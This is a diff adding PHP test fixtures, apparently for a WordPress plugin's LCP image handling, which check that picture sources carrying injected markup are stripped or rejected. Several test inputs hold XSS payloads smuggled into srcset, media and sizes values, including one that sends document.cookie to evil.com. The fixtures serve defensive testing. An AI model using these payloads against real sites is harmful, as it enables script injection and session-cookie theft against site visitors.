@@ -25,6 +25,22 @@ for ( $i = 1; $i <= 50; $i++ ) {
 	];
 }
 
+$mime_types = [
+	'jpg|jpeg|jpe' => 'image/jpeg',
+	'gif'          => 'image/gif',
+	'png'          => 'image/png',
+	'bmp'          => 'image/bmp',
+	'tiff|tif'     => 'image/tiff',
+	'webp'         => 'image/webp',
+	'avif'         => 'image/avif',
+	'ico'          => 'image/x-icon',
+	'heic'         => 'image/heic',
+	'heif'         => 'image/heif',
+	'heics'        => 'image/heic-sequence',
+	'heifs'        => 'image/heif-sequence',
+	'asf|asx'      => 'video/x-ms-asf',
+];
+
 return [
 	'testShouldBailWhenNotAllowed' => [
 		'config'   => [
@@ -1290,6 +1306,781 @@ return [
 				),
 				'viewport' 		=> '[]',
 				'last_accessed' => '2024-01-01 00:00:00',
+			],
+		],
+	],
+
+	// ========================================================================
+	// XSS VULNERABILITY TEST CASES - Picture Sources
+	// ========================================================================
+
+	/**
+	 * Test Case: XSS attempt via srcset with onerror event handler
+	 * Should sanitize/reject malicious srcset containing event handlers
+	 */
+	'testXSSInSrcsetOnerror' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode([
+				'lcp' => [
+					[
+						'type'    => 'picture',
+						'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+						'srcset'  => '',
+						'sizes'   => '',
+						'sources' => [
+							[
+								'srcset' => 'image.avif" onerror="alert(document.domain)',
+								'media'  => '',
+								'type'   => 'image/avif',
+								'sizes'  => '',
+							],
+						],
+						'label'   => 'lcp',
+					],
+				],
+			]),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext' => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result' => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+	/**
+	 * Test Case: XSS attempt via srcset with onload event handler
+	 * Should sanitize/reject malicious srcset containing onload
+	 */
+	'testXSSInSrcsetOnload' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'image.webp" onload="fetch(\'https://evil.com?c=\'+document.cookie)',
+									'media'  => '',
+									'type'   => 'image/webp',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'webp',
+				'type' => 'image/webp',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+	/**
+	 * Test Case: XSS attempt via media attribute
+	 * Should sanitize/reject malicious media query containing event handlers
+	 */
+	'testXSSInMediaAttribute' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'image.avif',
+									'media'  => 'screen" onfocus="alert(1)',
+									'type'   => 'image/avif',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => [
+				'jpg|jpeg|jpe' => 'image/jpeg',
+				'png'          => 'image/png',
+				'gif'          => 'image/gif',
+				'webp'         => 'image/webp',
+				'avif'         => 'image/avif',
+			],
+			'filetype' => [
+				'ext'  => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+	/**
+	 * Test Case: XSS attempt via sizes attribute
+	 * Should sanitize/reject malicious sizes containing event handlers
+	 */
+	'testXSSInSizesAttribute' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'image.avif',
+									'media'  => '',
+									'type'   => 'image/avif',
+									'sizes'  => '100vw" onload="alert(document.domain)',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: XSS attempt with HTML angle brackets in srcset
+	 * Should reject srcset containing < or > characters
+	 */
+	'testXSSWithAngleBrackets' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'image.avif<script>alert(1)</script>',
+									'media'  => '',
+									'type'   => 'image/avif',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url'          => 'http://example.org/test-page',
+				'is_mobile'    => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport'     => json_encode( [] ),
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: XSS attempt with single quotes in srcset
+	 * Should reject srcset containing single quotes
+	 */
+	'testXSSWithSingleQuotes' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => "image.avif' onclick='alert(1)",
+									'media'  => '',
+									'type'   => 'image/avif',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: XSS attempt with multiple event handlers in one source
+	 * Should reject source with multiple XSS vectors
+	 */
+	'testXSSMultipleEventHandlers' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'image.avif" onerror="alert(1)',
+									'media'  => 'screen" onfocus="alert(2)',
+									'type'   => 'image/avif',
+									'sizes'  => '100vw" onload="alert(3)',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: XSS attempt across multiple sources
+	 * Should reject entire picture if any source contains malicious content
+	 */
+	'testXSSMultipleSources' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'image.avif',
+									'media'  => '',
+									'type'   => 'image/avif',
+									'sizes'  => '',
+								],
+								[
+									'srcset' => 'image.webp" onerror="alert(1)',
+									'media'  => '',
+									'type'   => 'image/webp',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: Invalid MIME type (text/html)
+	 * Should reject sources with non-image MIME types
+	 */
+	'testInvalidMimeTypeHTML' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'malicious.html',
+									'media'  => '',
+									'type'   => 'text/html',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => false,
+				'type' => false,
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => 'not found',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => 'not found',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: Invalid MIME type (application/javascript)
+	 * Should reject sources with JavaScript MIME type
+	 */
+	'testInvalidMimeTypeJavaScript' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'script.js',
+									'media'  => '',
+									'type'   => 'application/javascript',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => false,
+				'type' => false,
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => 'not found',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => 'not found',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	// ========================================================================
+	// EDGE CASES
+	// ========================================================================
+
+	/**
+	 * Test Case: Empty sources array
+	 * Should handle empty sources gracefully
+	 */
+	'testEmptySourcesArray' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'jpg',
+				'type' => 'image/jpeg',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: Missing required srcset field
+	 * Should reject source missing srcset
+	 */
+	'testMissingSrcsetField' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => '',
+									'media'  => '',
+									'type'   => 'image/avif',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'avif',
+				'type' => 'image/avif',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
+
+	/**
+	 * Test Case: Missing required type field
+	 * Should reject source missing MIME type
+	 */
+	'testMissingTypeField' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => '/wp-content/uploads/image.avif',
+									'media'  => '',
+									'type'   => '',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => false,
+				'type' => false,
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => 'not found',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => 'not found',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
 			],
 		],
 	],
